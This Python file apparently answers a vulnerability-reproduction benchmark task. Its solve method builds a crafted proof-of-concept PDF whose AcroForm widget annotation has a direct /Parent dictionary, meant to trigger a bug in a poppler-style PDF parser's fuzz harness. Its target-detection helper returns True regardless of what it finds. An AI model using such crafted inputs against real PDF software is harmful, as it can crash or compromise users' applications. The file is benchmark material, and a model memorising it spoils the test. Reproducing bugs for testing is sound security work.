import io
import os
import re
import tarfile
from typing import List, Optional


class Solution:
    def _detect_pdf_target(self, src_path: str) -> bool:
        try:
            with tarfile.open(src_path, "r:*") as tf:
                c_like = (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh")
                hit = 0
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name = m.name.lower()
                    if not name.endswith(c_like):
                        continue
                    if m.size <= 0 or m.size > 2_000_000:
                        continue
                    f = tf.extractfile(m)
                    if not f:
                        continue
                    data = f.read()
                    if b"LLVMFuzzerTestOneInput" not in data and b"main(" not in data:
                        continue
                    hit += 1
                    if b"PDFDoc" in data or b"poppler" in data or b"%PDF" in data or b"xref" in data:
                        return True
                    if hit >= 40:
                        break
        except Exception:
            pass
        return True

    def _build_pdf(self, objs: List[bytes], root_obj_num: int) -> bytes:
        buf = bytearray()
        buf += b"%PDF-1.5\n%\xe2\xe3\xcf\xd3\n"

        offsets = [0] * (len(objs) + 1)  # 1-indexed

        for i, content in enumerate(objs, start=1):
            offsets[i] = len(buf)
            buf += f"{i} 0 obj\n".encode("ascii")
            buf += content
            if not content.endswith(b"\n"):
                buf += b"\n"
            buf += b"endobj\n"

        xref_off = len(buf)
        size = len(objs) + 1
        buf += f"xref\n0 {size}\n".encode("ascii")
        buf += b"0000000000 65535 f \n"
        for i in range(1, size):
            buf += f"{offsets[i]:010d} 00000 n \n".encode("ascii")

        buf += b"trailer\n"
        buf += f"<< /Size {size} /Root {root_obj_num} 0 R >>\n".encode("ascii")
        buf += b"startxref\n"
        buf += f"{xref_off}\n".encode("ascii")
        buf += b"%%EOF\n"
        return bytes(buf)

    def _make_poc_pdf(self) -> bytes:
        # Objects:
        # 1: Catalog with AcroForm
        # 2: Pages
        # 3: Page with Annots and empty Contents
        # 4: Widget annotation (standalone-like)
        # 5: Empty content stream
        # 6: AcroForm with empty Fields + default resources
        # 7: Font
        # 8: Widget annotation with a direct /Parent dict (forces Dict->Object paths)
        obj1 = b"<< /Type /Catalog /Pages 2 0 R /AcroForm 6 0 R >>"

        obj2 = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"

        obj3 = b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 100 100] /Resources << >> /Contents 5 0 R /Annots [4 0 R 8 0 R] >>"

        obj4 = b"<< /Type /Annot /Subtype /Widget /Rect [0 0 10 10] /FT /Tx /T (A) /V (B) /F 4 /P 3 0 R >>"

        stream_data = b""
        obj5 = b"<< /Length 0 >>\nstream\n" + stream_data + b"\nendstream"

        obj7 = b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>"

        obj6 = b"<< /Fields [] /DA (/F1 12 Tf 0 g) /DR << /Font << /F1 7 0 R >> >> >>"

        obj8 = (
            b"<< /Type /Annot /Subtype /Widget /Rect [0 0 20 20] /FT /Tx /T (A2) /V (D) "
            b"/Parent << /FT /Tx /T (P) /V (C) >> /F 4 /P 3 0 R >>"
        )

        objs = [obj1, obj2, obj3, obj4, obj5, obj6, obj7, obj8]
        return self._build_pdf(objs, root_obj_num=1)

    def solve(self, src_path: str) -> bytes:
        _ = self._detect_pdf_target(src_path)
        return self._make_poc_pdf()